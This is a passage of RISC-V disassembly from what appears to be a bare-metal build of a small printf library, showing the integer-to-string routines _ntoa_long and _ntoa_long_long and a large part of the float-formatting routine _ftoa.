    80004448:	fce43023          	sd	a4,-64(s0)
    8000444c:	fc843703          	ld	a4,-56(s0)
    80004450:	97ba                	add	a5,a5,a4
    80004452:	02000713          	li	a4,32
    80004456:	00e78023          	sb	a4,0(a5)
    8000445a:	4818                	lw	a4,16(s0)
    8000445c:	441c                	lw	a5,8(s0)
    8000445e:	88ba                	mv	a7,a4
    80004460:	883e                	mv	a6,a5
    80004462:	fc043783          	ld	a5,-64(s0)
    80004466:	fc843703          	ld	a4,-56(s0)
    8000446a:	fd043683          	ld	a3,-48(s0)
    8000446e:	fd843603          	ld	a2,-40(s0)
    80004472:	fe043583          	ld	a1,-32(s0)
    80004476:	fe843503          	ld	a0,-24(s0)
    8000447a:	c65ff0ef          	jal	800040de <_out_rev>
    8000447e:	87aa                	mv	a5,a0
    80004480:	853e                	mv	a0,a5
    80004482:	60a6                	ld	ra,72(sp)
    80004484:	6406                	ld	s0,64(sp)
    80004486:	6161                	addi	sp,sp,80
    80004488:	8082                	ret

Disassembly of section .text._ntoa_long:

000000008000448a <_ntoa_long>:
    8000448a:	7135                	addi	sp,sp,-160
    8000448c:	ed06                	sd	ra,152(sp)
    8000448e:	e922                	sd	s0,144(sp)
    80004490:	1100                	addi	s0,sp,160
    80004492:	faa43c23          	sd	a0,-72(s0)
    80004496:	fab43823          	sd	a1,-80(s0)
    8000449a:	fac43423          	sd	a2,-88(s0)
    8000449e:	fad43023          	sd	a3,-96(s0)
    800044a2:	f8e43c23          	sd	a4,-104(s0)
    800044a6:	f9043423          	sd	a6,-120(s0)
    800044aa:	8746                	mv	a4,a7
    800044ac:	f8f40ba3          	sb	a5,-105(s0)
    800044b0:	87ba                	mv	a5,a4
    800044b2:	f8f42823          	sw	a5,-112(s0)
    800044b6:	fe043423          	sd	zero,-24(s0)
    800044ba:	f9843783          	ld	a5,-104(s0)
    800044be:	e781                	bnez	a5,800044c6 <_ntoa_long+0x3c>
    800044c0:	441c                	lw	a5,8(s0)
    800044c2:	9bbd                	andi	a5,a5,-17
    800044c4:	c41c                	sw	a5,8(s0)
    800044c6:	441c                	lw	a5,8(s0)
    800044c8:	4007f793          	andi	a5,a5,1024
    800044cc:	2781                	sext.w	a5,a5
    800044ce:	c781                	beqz	a5,800044d6 <_ntoa_long+0x4c>
    800044d0:	f9843783          	ld	a5,-104(s0)
    800044d4:	c3d9                	beqz	a5,8000455a <_ntoa_long+0xd0>
    800044d6:	f9843703          	ld	a4,-104(s0)
    800044da:	f8843783          	ld	a5,-120(s0)
    800044de:	02f777b3          	remu	a5,a4,a5
    800044e2:	fef403a3          	sb	a5,-25(s0)
    800044e6:	fe744783          	lbu	a5,-25(s0)
    800044ea:	0ff7f713          	zext.b	a4,a5
    800044ee:	47a5                	li	a5,9
    800044f0:	00e7e963          	bltu	a5,a4,80004502 <_ntoa_long+0x78>
    800044f4:	fe744783          	lbu	a5,-25(s0)
    800044f8:	0307879b          	addiw	a5,a5,48
    800044fc:	0ff7f793          	zext.b	a5,a5
    80004500:	a01d                	j	80004526 <_ntoa_long+0x9c>
    80004502:	441c                	lw	a5,8(s0)
    80004504:	0207f793          	andi	a5,a5,32
    80004508:	2781                	sext.w	a5,a5
    8000450a:	c781                	beqz	a5,80004512 <_ntoa_long+0x88>
    8000450c:	04100793          	li	a5,65
    80004510:	a019                	j	80004516 <_ntoa_long+0x8c>
    80004512:	06100793          	li	a5,97
    80004516:	fe744703          	lbu	a4,-25(s0)
    8000451a:	9fb9                	addw	a5,a5,a4
    8000451c:	0ff7f793          	zext.b	a5,a5
    80004520:	37d9                	addiw	a5,a5,-10
    80004522:	0ff7f793          	zext.b	a5,a5
    80004526:	fe843703          	ld	a4,-24(s0)
    8000452a:	00170693          	addi	a3,a4,1
    8000452e:	fed43423          	sd	a3,-24(s0)
    80004532:	1741                	addi	a4,a4,-16
    80004534:	9722                	add	a4,a4,s0
    80004536:	fcf70823          	sb	a5,-48(a4)
    8000453a:	f9843703          	ld	a4,-104(s0)
    8000453e:	f8843783          	ld	a5,-120(s0)
    80004542:	02f757b3          	divu	a5,a4,a5
    80004546:	f8f43c23          	sd	a5,-104(s0)
    8000454a:	f9843783          	ld	a5,-104(s0)
    8000454e:	c791                	beqz	a5,8000455a <_ntoa_long+0xd0>
    80004550:	fe843703          	ld	a4,-24(s0)
    80004554:	47fd                	li	a5,31
    80004556:	f8e7f0e3          	bgeu	a5,a4,800044d6 <_ntoa_long+0x4c>
    8000455a:	f8843783          	ld	a5,-120(s0)
    8000455e:	0007861b          	sext.w	a2,a5
    80004562:	f9744683          	lbu	a3,-105(s0)
    80004566:	fc040713          	addi	a4,s0,-64
    8000456a:	441c                	lw	a5,8(s0)
    8000456c:	e83e                	sd	a5,16(sp)
    8000456e:	401c                	lw	a5,0(s0)
    80004570:	e43e                	sd	a5,8(sp)
    80004572:	f9042783          	lw	a5,-112(s0)
    80004576:	e03e                	sd	a5,0(sp)
    80004578:	88b2                	mv	a7,a2
    8000457a:	8836                	mv	a6,a3
    8000457c:	fe843783          	ld	a5,-24(s0)
    80004580:	fa043683          	ld	a3,-96(s0)
    80004584:	fa843603          	ld	a2,-88(s0)
    80004588:	fb043583          	ld	a1,-80(s0)
    8000458c:	fb843503          	ld	a0,-72(s0)
    80004590:	c61ff0ef          	jal	800041f0 <_ntoa_format>
    80004594:	87aa                	mv	a5,a0
    80004596:	853e                	mv	a0,a5
    80004598:	60ea                	ld	ra,152(sp)
    8000459a:	644a                	ld	s0,144(sp)
    8000459c:	610d                	addi	sp,sp,160
    8000459e:	8082                	ret

Disassembly of section .text._ntoa_long_long:

00000000800045a0 <_ntoa_long_long>:
    800045a0:	7135                	addi	sp,sp,-160
    800045a2:	ed06                	sd	ra,152(sp)
    800045a4:	e922                	sd	s0,144(sp)
    800045a6:	1100                	addi	s0,sp,160
    800045a8:	faa43c23          	sd	a0,-72(s0)
    800045ac:	fab43823          	sd	a1,-80(s0)
    800045b0:	fac43423          	sd	a2,-88(s0)
    800045b4:	fad43023          	sd	a3,-96(s0)
    800045b8:	f8e43c23          	sd	a4,-104(s0)
    800045bc:	f9043423          	sd	a6,-120(s0)
    800045c0:	8746                	mv	a4,a7
    800045c2:	f8f40ba3          	sb	a5,-105(s0)
    800045c6:	87ba                	mv	a5,a4
    800045c8:	f8f42823          	sw	a5,-112(s0)
    800045cc:	fe043423          	sd	zero,-24(s0)
    800045d0:	f9843783          	ld	a5,-104(s0)
    800045d4:	e781                	bnez	a5,800045dc <_ntoa_long_long+0x3c>
    800045d6:	441c                	lw	a5,8(s0)
    800045d8:	9bbd                	andi	a5,a5,-17
    800045da:	c41c                	sw	a5,8(s0)
    800045dc:	441c                	lw	a5,8(s0)
    800045de:	4007f793          	andi	a5,a5,1024
    800045e2:	2781                	sext.w	a5,a5
    800045e4:	c781                	beqz	a5,800045ec <_ntoa_long_long+0x4c>
    800045e6:	f9843783          	ld	a5,-104(s0)
    800045ea:	c3d9                	beqz	a5,80004670 <_ntoa_long_long+0xd0>
    800045ec:	f9843703          	ld	a4,-104(s0)
    800045f0:	f8843783          	ld	a5,-120(s0)
    800045f4:	02f777b3          	remu	a5,a4,a5
    800045f8:	fef403a3          	sb	a5,-25(s0)
    800045fc:	fe744783          	lbu	a5,-25(s0)
    80004600:	0ff7f713          	zext.b	a4,a5
    80004604:	47a5                	li	a5,9
    80004606:	00e7e963          	bltu	a5,a4,80004618 <_ntoa_long_long+0x78>
    8000460a:	fe744783          	lbu	a5,-25(s0)
    8000460e:	0307879b          	addiw	a5,a5,48
    80004612:	0ff7f793          	zext.b	a5,a5
    80004616:	a01d                	j	8000463c <_ntoa_long_long+0x9c>
    80004618:	441c                	lw	a5,8(s0)
    8000461a:	0207f793          	andi	a5,a5,32
    8000461e:	2781                	sext.w	a5,a5
    80004620:	c781                	beqz	a5,80004628 <_ntoa_long_long+0x88>
    80004622:	04100793          	li	a5,65
    80004626:	a019                	j	8000462c <_ntoa_long_long+0x8c>
    80004628:	06100793          	li	a5,97
    8000462c:	fe744703          	lbu	a4,-25(s0)
    80004630:	9fb9                	addw	a5,a5,a4
    80004632:	0ff7f793          	zext.b	a5,a5
    80004636:	37d9                	addiw	a5,a5,-10
    80004638:	0ff7f793          	zext.b	a5,a5
    8000463c:	fe843703          	ld	a4,-24(s0)
    80004640:	00170693          	addi	a3,a4,1
    80004644:	fed43423          	sd	a3,-24(s0)
    80004648:	1741                	addi	a4,a4,-16
    8000464a:	9722                	add	a4,a4,s0
    8000464c:	fcf70823          	sb	a5,-48(a4)
    80004650:	f9843703          	ld	a4,-104(s0)
    80004654:	f8843783          	ld	a5,-120(s0)
    80004658:	02f757b3          	divu	a5,a4,a5
    8000465c:	f8f43c23          	sd	a5,-104(s0)
    80004660:	f9843783          	ld	a5,-104(s0)
    80004664:	c791                	beqz	a5,80004670 <_ntoa_long_long+0xd0>
    80004666:	fe843703          	ld	a4,-24(s0)
    8000466a:	47fd                	li	a5,31
    8000466c:	f8e7f0e3          	bgeu	a5,a4,800045ec <_ntoa_long_long+0x4c>
    80004670:	f8843783          	ld	a5,-120(s0)
    80004674:	0007861b          	sext.w	a2,a5
    80004678:	f9744683          	lbu	a3,-105(s0)
    8000467c:	fc040713          	addi	a4,s0,-64
    80004680:	441c                	lw	a5,8(s0)
    80004682:	e83e                	sd	a5,16(sp)
    80004684:	401c                	lw	a5,0(s0)
    80004686:	e43e                	sd	a5,8(sp)
    80004688:	f9042783          	lw	a5,-112(s0)
    8000468c:	e03e                	sd	a5,0(sp)
    8000468e:	88b2                	mv	a7,a2
    80004690:	8836                	mv	a6,a3
    80004692:	fe843783          	ld	a5,-24(s0)
    80004696:	fa043683          	ld	a3,-96(s0)
    8000469a:	fa843603          	ld	a2,-88(s0)
    8000469e:	fb043583          	ld	a1,-80(s0)
    800046a2:	fb843503          	ld	a0,-72(s0)
    800046a6:	b4bff0ef          	jal	800041f0 <_ntoa_format>
    800046aa:	87aa                	mv	a5,a0
    800046ac:	853e                	mv	a0,a5
    800046ae:	60ea                	ld	ra,152(sp)
    800046b0:	644a                	ld	s0,144(sp)
    800046b2:	610d                	addi	sp,sp,160
    800046b4:	8082                	ret

Disassembly of section .text._ftoa:

00000000800046b6 <_ftoa>:
    800046b6:	7135                	addi	sp,sp,-160
    800046b8:	ed06                	sd	ra,152(sp)
    800046ba:	e922                	sd	s0,144(sp)
    800046bc:	1100                	addi	s0,sp,160
    800046be:	f8a43c23          	sd	a0,-104(s0)
    800046c2:	f8b43823          	sd	a1,-112(s0)
    800046c6:	f8c43423          	sd	a2,-120(s0)
    800046ca:	f8d43023          	sd	a3,-128(s0)
    800046ce:	f6a43c27          	fsd	fa0,-136(s0)
    800046d2:	863a                	mv	a2,a4
    800046d4:	86be                	mv	a3,a5
    800046d6:	8742                	mv	a4,a6
    800046d8:	87b2                	mv	a5,a2
    800046da:	f6f42a23          	sw	a5,-140(s0)
    800046de:	87b6                	mv	a5,a3
    800046e0:	f6f42823          	sw	a5,-144(s0)
    800046e4:	87ba                	mv	a5,a4
    800046e6:	f6f42623          	sw	a5,-148(s0)
    800046ea:	fe043423          	sd	zero,-24(s0)
    800046ee:	f20007d3          	fmv.d.x	fa5,zero
    800046f2:	fcf43427          	fsd	fa5,-56(s0)
    800046f6:	f7843707          	fld	fa4,-136(s0)
    800046fa:	f7843787          	fld	fa5,-136(s0)
    800046fe:	a2f727d3          	feq.d	a5,fa4,fa5
    80004702:	eb85                	bnez	a5,80004732 <_ftoa+0x7c>
    80004704:	f6c42703          	lw	a4,-148(s0)
    80004708:	f7042783          	lw	a5,-144(s0)
    8000470c:	88ba                	mv	a7,a4
    8000470e:	883e                	mv	a6,a5
    80004710:	478d                	li	a5,3
    80004712:	00002717          	auipc	a4,0x2
    80004716:	5ee70713          	addi	a4,a4,1518 # 80006d00 <__am_mainargs+0x143>
    8000471a:	f8043683          	ld	a3,-128(s0)
    8000471e:	f8843603          	ld	a2,-120(s0)
    80004722:	f9043583          	ld	a1,-112(s0)
    80004726:	f9843503          	ld	a0,-104(s0)
    8000472a:	9b5ff0ef          	jal	800040de <_out_rev>
    8000472e:	87aa                	mv	a5,a0
    80004730:	a97d                	j	80004bee <_ftoa+0x538>
    80004732:	f7843707          	fld	fa4,-136(s0)
    80004736:	00002797          	auipc	a5,0x2
    8000473a:	5ea78793          	addi	a5,a5,1514 # 80006d20 <__am_mainargs+0x163>
    8000473e:	239c                	fld	fa5,0(a5)
    80004740:	a2f717d3          	flt.d	a5,fa4,fa5
    80004744:	cb85                	beqz	a5,80004774 <_ftoa+0xbe>
    80004746:	f6c42703          	lw	a4,-148(s0)
    8000474a:	f7042783          	lw	a5,-144(s0)
    8000474e:	88ba                	mv	a7,a4
    80004750:	883e                	mv	a6,a5
    80004752:	4791                	li	a5,4
    80004754:	00002717          	auipc	a4,0x2
    80004758:	5b470713          	addi	a4,a4,1460 # 80006d08 <__am_mainargs+0x14b>
    8000475c:	f8043683          	ld	a3,-128(s0)
    80004760:	f8843603          	ld	a2,-120(s0)
    80004764:	f9043583          	ld	a1,-112(s0)
    80004768:	f9843503          	ld	a0,-104(s0)
    8000476c:	973ff0ef          	jal	800040de <_out_rev>
    80004770:	87aa                	mv	a5,a0
    80004772:	a9b5                	j	80004bee <_ftoa+0x538>
    80004774:	f7843707          	fld	fa4,-136(s0)
    80004778:	00002797          	auipc	a5,0x2
    8000477c:	5b078793          	addi	a5,a5,1456 # 80006d28 <__am_mainargs+0x16b>
    80004780:	239c                	fld	fa5,0(a5)
    80004782:	a2e797d3          	flt.d	a5,fa5,fa4
    80004786:	cba9                	beqz	a5,800047d8 <_ftoa+0x122>
    80004788:	f6c42783          	lw	a5,-148(s0)
    8000478c:	8b91                	andi	a5,a5,4
    8000478e:	2781                	sext.w	a5,a5
    80004790:	c791                	beqz	a5,8000479c <_ftoa+0xe6>
    80004792:	00002717          	auipc	a4,0x2
    80004796:	57e70713          	addi	a4,a4,1406 # 80006d10 <__am_mainargs+0x153>
    8000479a:	a029                	j	800047a4 <_ftoa+0xee>
    8000479c:	00002717          	auipc	a4,0x2
    800047a0:	57c70713          	addi	a4,a4,1404 # 80006d18 <__am_mainargs+0x15b>
    800047a4:	f6c42783          	lw	a5,-148(s0)
    800047a8:	8b91                	andi	a5,a5,4
    800047aa:	2781                	sext.w	a5,a5
    800047ac:	c399                	beqz	a5,800047b2 <_ftoa+0xfc>
    800047ae:	4791                	li	a5,4
    800047b0:	a011                	j	800047b4 <_ftoa+0xfe>
    800047b2:	478d                	li	a5,3
    800047b4:	f6c42603          	lw	a2,-148(s0)
    800047b8:	f7042683          	lw	a3,-144(s0)
    800047bc:	88b2                	mv	a7,a2
    800047be:	8836                	mv	a6,a3
    800047c0:	f8043683          	ld	a3,-128(s0)
    800047c4:	f8843603          	ld	a2,-120(s0)
    800047c8:	f9043583          	ld	a1,-112(s0)
    800047cc:	f9843503          	ld	a0,-104(s0)
    800047d0:	90fff0ef          	jal	800040de <_out_rev>
    800047d4:	87aa                	mv	a5,a0
    800047d6:	a921                	j	80004bee <_ftoa+0x538>
    800047d8:	f7843707          	fld	fa4,-136(s0)
    800047dc:	00002797          	auipc	a5,0x2
    800047e0:	55478793          	addi	a5,a5,1364 # 80006d30 <__am_mainargs+0x173>
    800047e4:	239c                	fld	fa5,0(a5)
    800047e6:	a2e797d3          	flt.d	a5,fa5,fa4
    800047ea:	eb99                	bnez	a5,80004800 <_ftoa+0x14a>
    800047ec:	f7843707          	fld	fa4,-136(s0)
    800047f0:	00002797          	auipc	a5,0x2
    800047f4:	54878793          	addi	a5,a5,1352 # 80006d38 <__am_mainargs+0x17b>
    800047f8:	239c                	fld	fa5,0(a5)
    800047fa:	a2f717d3          	flt.d	a5,fa4,fa5
    800047fe:	c795                	beqz	a5,8000482a <_ftoa+0x174>
    80004800:	f6c42683          	lw	a3,-148(s0)
    80004804:	f7042783          	lw	a5,-144(s0)
    80004808:	f7442703          	lw	a4,-140(s0)
    8000480c:	8836                	mv	a6,a3
    8000480e:	f7843507          	fld	fa0,-136(s0)
    80004812:	f8043683          	ld	a3,-128(s0)
    80004816:	f8843603          	ld	a2,-120(s0)
    8000481a:	f9043583          	ld	a1,-112(s0)
    8000481e:	f9843503          	ld	a0,-104(s0)
    80004822:	3d6000ef          	jal	80004bf8 <_etoa>
    80004826:	87aa                	mv	a5,a0
    80004828:	a6d9                	j	80004bee <_ftoa+0x538>
    8000482a:	fe0403a3          	sb	zero,-25(s0)
    8000482e:	f7843787          	fld	fa5,-136(s0)
    80004832:	f2000753          	fmv.d.x	fa4,zero
    80004836:	a2e797d3          	flt.d	a5,fa5,fa4
    8000483a:	cf81                	beqz	a5,80004852 <_ftoa+0x19c>
    8000483c:	4785                	li	a5,1
    8000483e:	fef403a3          	sb	a5,-25(s0)
    80004842:	f2000753          	fmv.d.x	fa4,zero
    80004846:	f7843787          	fld	fa5,-136(s0)
    8000484a:	0af777d3          	fsub.d	fa5,fa4,fa5
    8000484e:	f6f43c27          	fsd	fa5,-136(s0)
    80004852:	f6c42783          	lw	a5,-148(s0)
    80004856:	4007f793          	andi	a5,a5,1024
    8000485a:	2781                	sext.w	a5,a5
    8000485c:	e795                	bnez	a5,80004888 <_ftoa+0x1d2>
    8000485e:	4799                	li	a5,6
    80004860:	f6f42a23          	sw	a5,-140(s0)
    80004864:	a015                	j	80004888 <_ftoa+0x1d2>
    80004866:	fe843783          	ld	a5,-24(s0)
    8000486a:	00178713          	addi	a4,a5,1
    8000486e:	fee43423          	sd	a4,-24(s0)
    80004872:	17c1                	addi	a5,a5,-16
    80004874:	97a2                	add	a5,a5,s0
    80004876:	03000713          	li	a4,48
    8000487a:	fae78823          	sb	a4,-80(a5)
    8000487e:	f7442783          	lw	a5,-140(s0)
    80004882:	37fd                	addiw	a5,a5,-1
    80004884:	f6f42a23          	sw	a5,-140(s0)
    80004888:	fe843703          	ld	a4,-24(s0)
    8000488c:	47fd                	li	a5,31
    8000488e:	00e7e963          	bltu	a5,a4,800048a0 <_ftoa+0x1ea>
    80004892:	f7442783          	lw	a5,-140(s0)
    80004896:	0007871b          	sext.w	a4,a5
    8000489a:	47a5                	li	a5,9
    8000489c:	fce7e5e3          	bltu	a5,a4,80004866 <_ftoa+0x1b0>
    800048a0:	f7843787          	fld	fa5,-136(s0)
    800048a4:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    800048a8:	fef42023          	sw	a5,-32(s0)
    800048ac:	fe042783          	lw	a5,-32(s0)
    800048b0:	d20787d3          	fcvt.d.w	fa5,a5
    800048b4:	f7843707          	fld	fa4,-136(s0)
    800048b8:	0af77753          	fsub.d	fa4,fa4,fa5
    800048bc:	00002717          	auipc	a4,0x2
    800048c0:	69c70713          	addi	a4,a4,1692 # 80006f58 <pow10.0>
    800048c4:	f7446783          	lwu	a5,-140(s0)
    800048c8:	078e                	slli	a5,a5,0x3
    800048ca:	97ba                	add	a5,a5,a4
    800048cc:	239c                	fld	fa5,0(a5)
    800048ce:	12f777d3          	fmul.d	fa5,fa4,fa5
    800048d2:	fcf43027          	fsd	fa5,-64(s0)
    800048d6:	fc043787          	fld	fa5,-64(s0)
    800048da:	c23797d3          	fcvt.lu.d	a5,fa5,rtz
    800048de:	fcf43c23          	sd	a5,-40(s0)
    800048e2:	fd843783          	ld	a5,-40(s0)
    800048e6:	d237f7d3          	fcvt.d.lu	fa5,a5
    800048ea:	fc043707          	fld	fa4,-64(s0)
    800048ee:	0af777d3          	fsub.d	fa5,fa4,fa5
    800048f2:	fcf43427          	fsd	fa5,-56(s0)
    800048f6:	fc843707          	fld	fa4,-56(s0)
    800048fa:	00002797          	auipc	a5,0x2
    800048fe:	44678793          	addi	a5,a5,1094 # 80006d40 <__am_mainargs+0x183>
    80004902:	239c                	fld	fa5,0(a5)
    80004904:	a2e797d3          	flt.d	a5,fa5,fa4
    80004908:	cf95                	beqz	a5,80004944 <_ftoa+0x28e>
    8000490a:	fd843783          	ld	a5,-40(s0)
    8000490e:	0785                	addi	a5,a5,1
    80004910:	fcf43c23          	sd	a5,-40(s0)
    80004914:	fd843783          	ld	a5,-40(s0)
    80004918:	d237f753          	fcvt.d.lu	fa4,a5
    8000491c:	00002717          	auipc	a4,0x2
    80004920:	63c70713          	addi	a4,a4,1596 # 80006f58 <pow10.0>
    80004924:	f7446783          	lwu	a5,-140(s0)
    80004928:	078e                	slli	a5,a5,0x3
    8000492a:	97ba                	add	a5,a5,a4
    8000492c:	239c                	fld	fa5,0(a5)
    8000492e:	a2e787d3          	fle.d	a5,fa5,fa4
    80004932:	cf9d                	beqz	a5,80004970 <_ftoa+0x2ba>
    80004934:	fc043c23          	sd	zero,-40(s0)
    80004938:	fe042783          	lw	a5,-32(s0)
    8000493c:	2785                	addiw	a5,a5,1
    8000493e:	fef42023          	sw	a5,-32(s0)
    80004942:	a03d                	j	80004970 <_ftoa+0x2ba>
    80004944:	fc843707          	fld	fa4,-56(s0)
    80004948:	00002797          	auipc	a5,0x2
    8000494c:	3f878793          	addi	a5,a5,1016 # 80006d40 <__am_mainargs+0x183>
    80004950:	239c                	fld	fa5,0(a5)
    80004952:	a2f717d3          	flt.d	a5,fa4,fa5
    80004956:	ef89                	bnez	a5,80004970 <_ftoa+0x2ba>
    80004958:	fd843783          	ld	a5,-40(s0)
    8000495c:	c789                	beqz	a5,80004966 <_ftoa+0x2b0>
    8000495e:	fd843783          	ld	a5,-40(s0)
    80004962:	8b85                	andi	a5,a5,1
    80004964:	c791                	beqz	a5,80004970 <_ftoa+0x2ba>
    80004966:	fd843783          	ld	a5,-40(s0)
    8000496a:	0785                	addi	a5,a5,1
    8000496c:	fcf43c23          	sd	a5,-40(s0)
    80004970:	f7442783          	lw	a5,-140(s0)
    80004974:	2781                	sext.w	a5,a5
    80004976:	e3bd                	bnez	a5,800049dc <_ftoa+0x326>
    80004978:	fe042783          	lw	a5,-32(s0)
    8000497c:	d20787d3          	fcvt.d.w	fa5,a5
    80004980:	f7843707          	fld	fa4,-136(s0)
    80004984:	0af777d3          	fsub.d	fa5,fa4,fa5
    80004988:	fcf43427          	fsd	fa5,-56(s0)
    8000498c:	fc843707          	fld	fa4,-56(s0)
    80004990:	00002797          	auipc	a5,0x2
    80004994:	3b078793          	addi	a5,a5,944 # 80006d40 <__am_mainargs+0x183>
    80004998:	239c                	fld	fa5,0(a5)
    8000499a:	a2f717d3          	flt.d	a5,fa4,fa5
    8000499e:	00f037b3          	snez	a5,a5
    800049a2:	0ff7f793          	zext.b	a5,a5
    800049a6:	0017c793          	xori	a5,a5,1
    800049aa:	0ff7f793          	zext.b	a5,a5
    800049ae:	eb99                	bnez	a5,800049c4 <_ftoa+0x30e>
    800049b0:	fc843707          	fld	fa4,-56(s0)
    800049b4:	00002797          	auipc	a5,0x2
    800049b8:	38c78793          	addi	a5,a5,908 # 80006d40 <__am_mainargs+0x183>
    800049bc:	239c                	fld	fa5,0(a5)
    800049be:	a2e797d3          	flt.d	a5,fa5,fa4
    800049c2:	c7f9                	beqz	a5,80004a90 <_ftoa+0x3da>
    800049c4:	fe042783          	lw	a5,-32(s0)
    800049c8:	8b85                	andi	a5,a5,1
    800049ca:	2781                	sext.w	a5,a5
    800049cc:	10078663          	beqz	a5,80004ad8 <_ftoa+0x422>
    800049d0:	fe042783          	lw	a5,-32(s0)
    800049d4:	2785                	addiw	a5,a5,1
    800049d6:	fef42023          	sw	a5,-32(s0)
    800049da:	a8fd                	j	80004ad8 <_ftoa+0x422>
    800049dc:	f7442783          	lw	a5,-140(s0)
    800049e0:	fcf42a23          	sw	a5,-44(s0)
    800049e4:	a0a9                	j	80004a2e <_ftoa+0x378>
    800049e6:	fd442783          	lw	a5,-44(s0)
    800049ea:	37fd                	addiw	a5,a5,-1
    800049ec:	fcf42a23          	sw	a5,-44(s0)
    800049f0:	fd843703          	ld	a4,-40(s0)
    800049f4:	47a9                	li	a5,10
    800049f6:	02f777b3          	remu	a5,a4,a5
    800049fa:	0ff7f713          	zext.b	a4,a5
    800049fe:	fe843783          	ld	a5,-24(s0)
    80004a02:	00178693          	addi	a3,a5,1
    80004a06:	fed43423          	sd	a3,-24(s0)
    80004a0a:	0307071b          	addiw	a4,a4,48
    80004a0e:	0ff77713          	zext.b	a4,a4
    80004a12:	17c1                	addi	a5,a5,-16
    80004a14:	97a2                	add	a5,a5,s0
    80004a16:	fae78823          	sb	a4,-80(a5)
    80004a1a:	fd843703          	ld	a4,-40(s0)
    80004a1e:	47a9                	li	a5,10
    80004a20:	02f757b3          	divu	a5,a4,a5
    80004a24:	fcf43c23          	sd	a5,-40(s0)
    80004a28:	fd843783          	ld	a5,-40(s0)
    80004a2c:	c799                	beqz	a5,80004a3a <_ftoa+0x384>
    80004a2e:	fe843703          	ld	a4,-24(s0)
    80004a32:	47fd                	li	a5,31
    80004a34:	fae7f9e3          	bgeu	a5,a4,800049e6 <_ftoa+0x330>
    80004a38:	a839                	j	80004a56 <_ftoa+0x3a0>
    80004a3a:	0001                	nop
    80004a3c:	a829                	j	80004a56 <_ftoa+0x3a0>
    80004a3e:	fe843783          	ld	a5,-24(s0)
    80004a42:	00178713          	addi	a4,a5,1
    80004a46:	fee43423          	sd	a4,-24(s0)
    80004a4a:	17c1                	addi	a5,a5,-16
    80004a4c:	97a2                	add	a5,a5,s0
    80004a4e:	03000713          	li	a4,48
    80004a52:	fae78823          	sb	a4,-80(a5)
    80004a56:	fe843703          	ld	a4,-24(s0)
    80004a5a:	47fd                	li	a5,31
    80004a5c:	00e7e963          	bltu	a5,a4,80004a6e <_ftoa+0x3b8>
    80004a60:	fd442783          	lw	a5,-44(s0)
    80004a64:	fff7871b          	addiw	a4,a5,-1
    80004a68:	fce42a23          	sw	a4,-44(s0)
    80004a6c:	fbe9                	bnez	a5,80004a3e <_ftoa+0x388>
    80004a6e:	fe843703          	ld	a4,-24(s0)
    80004a72:	47fd                	li	a5,31
    80004a74:	06e7e263          	bltu	a5,a4,80004ad8 <_ftoa+0x422>
    80004a78:	fe843783          	ld	a5,-24(s0)
    80004a7c:	00178713          	addi	a4,a5,1
    80004a80:	fee43423          	sd	a4,-24(s0)
    80004a84:	17c1                	addi	a5,a5,-16
    80004a86:	97a2                	add	a5,a5,s0
    80004a88:	02e00713          	li	a4,46
    80004a8c:	fae78823          	sb	a4,-80(a5)
    80004a90:	a0a1                	j	80004ad8 <_ftoa+0x422>
    80004a92:	fe042783          	lw	a5,-32(s0)
    80004a96:	873e                	mv	a4,a5
    80004a98:	47a9                	li	a5,10
    80004a9a:	02f767bb          	remw	a5,a4,a5
    80004a9e:	2781                	sext.w	a5,a5
    80004aa0:	0ff7f713          	zext.b	a4,a5
    80004aa4:	fe843783          	ld	a5,-24(s0)
    80004aa8:	00178693          	addi	a3,a5,1
    80004aac:	fed43423          	sd	a3,-24(s0)
    80004ab0:	0307071b          	addiw	a4,a4,48
    80004ab4:	0ff77713          	zext.b	a4,a4
    80004ab8:	17c1                	addi	a5,a5,-16
    80004aba:	97a2                	add	a5,a5,s0
    80004abc:	fae78823          	sb	a4,-80(a5)
    80004ac0:	fe042783          	lw	a5,-32(s0)
    80004ac4:	873e                	mv	a4,a5
    80004ac6:	47a9                	li	a5,10
    80004ac8:	02f747bb          	divw	a5,a4,a5
    80004acc:	fef42023          	sw	a5,-32(s0)
    80004ad0:	fe042783          	lw	a5,-32(s0)
    80004ad4:	2781                	sext.w	a5,a5
    80004ad6:	c799                	beqz	a5,80004ae4 <_ftoa+0x42e>
    80004ad8:	fe843703          	ld	a4,-24(s0)
    80004adc:	47fd                	li	a5,31
    80004ade:	fae7fae3          	bgeu	a5,a4,80004a92 <_ftoa+0x3dc>
    80004ae2:	a011                	j	80004ae6 <_ftoa+0x430>
    80004ae4:	0001                	nop
    80004ae6:	f6c42783          	lw	a5,-148(s0)
    80004aea:	8b89                	andi	a5,a5,2
    80004aec:	2781                	sext.w	a5,a5
    80004aee:	e3ad                	bnez	a5,80004b50 <_ftoa+0x49a>
    80004af0:	f6c42783          	lw	a5,-148(s0)
    80004af4:	8b85                	andi	a5,a5,1
    80004af6:	2781                	sext.w	a5,a5
    80004af8:	cfa1                	beqz	a5,80004b50 <_ftoa+0x49a>
    80004afa:	f7042783          	lw	a5,-144(s0)
    80004afe:	2781                	sext.w	a5,a5
    80004b00:	cf8d                	beqz	a5,80004b3a <_ftoa+0x484>
    80004b02:	fe744783          	lbu	a5,-25(s0)
    80004b06:	0ff7f793          	zext.b	a5,a5
    80004b0a:	e791                	bnez	a5,80004b16 <_ftoa+0x460>
    80004b0c:	f6c42783          	lw	a5,-148(s0)
    80004b10:	8bb1                	andi	a5,a5,12
    80004b12:	2781                	sext.w	a5,a5
    80004b14:	c39d                	beqz	a5,80004b3a <_ftoa+0x484>
    80004b16:	f7042783          	lw	a5,-144(s0)
    80004b1a:	37fd                	addiw	a5,a5,-1
    80004b1c:	f6f42823          	sw	a5,-144(s0)
    80004b20:	a829                	j	80004b3a <_ftoa+0x484>
    80004b22:	fe843783          	ld	a5,-24(s0)
    80004b26:	00178713          	addi	a4,a5,1
    80004b2a:	fee43423          	sd	a4,-24(s0)
    80004b2e:	17c1                	addi	a5,a5,-16
    80004b30:	97a2                	add	a5,a5,s0
    80004b32:	03000713          	li	a4,48
    80004b36:	fae78823          	sb	a4,-80(a5)
    80004b3a:	f7046783          	lwu	a5,-144(s0)
    80004b3e:	fe843703          	ld	a4,-24(s0)
    80004b42:	00f77763          	bgeu	a4,a5,80004b50 <_ftoa+0x49a>
    80004b46:	fe843703          	ld	a4,-24(s0)
    80004b4a:	47fd                	li	a5,31
    80004b4c:	fce7fbe3          	bgeu	a5,a4,80004b22 <_ftoa+0x46c>
    80004b50:	fe843703          	ld	a4,-24(s0)
